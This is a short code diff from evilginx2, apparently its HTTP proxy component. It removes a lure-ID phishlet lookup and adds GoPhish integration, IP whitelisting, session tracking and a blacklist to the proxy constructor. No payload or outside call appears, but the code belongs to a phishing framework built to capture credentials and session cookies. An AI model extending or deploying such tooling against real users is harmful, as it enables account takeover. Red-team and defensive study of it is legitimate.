@@ -42,7 +42,6 @@ import (
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
-	"github.com/kgretzky/evilginx2/lure"
 )
 
 const (
@@ -107,13 +106,20 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 	return newBody, nil
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, lureStore *lure.Store) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
+		crt_db:            crt_db,
 		cfg:               cfg,
+		db:                db,
+		bl:                bl,
+		gophish:           NewGoPhish(),
 		isRunning:         false,
 		last_sid:          0,
+		developer:         developer,
+		ip_whitelist:      make(map[string]int64),
+		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 	}
 
@@ -1686,21 +1692,6 @@ func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
 		}
 	}
 
-	return nil
-}
-
-func (p *HttpProxy) getPhishletByLureID(lureID string, lureStore *lure.Store) *Phishlet {
-	dataObj, err := lureStore.Get(lureID)
-	if err != nil {
-		return nil
-	}
-	phName := dataObj.PhishletName
-	if phName == "" {
-		return nil
-	}
-	if pl, ok := p.cfg.phishlets[phName]; ok {
-		return pl
-	}
 	return nil
 }
 
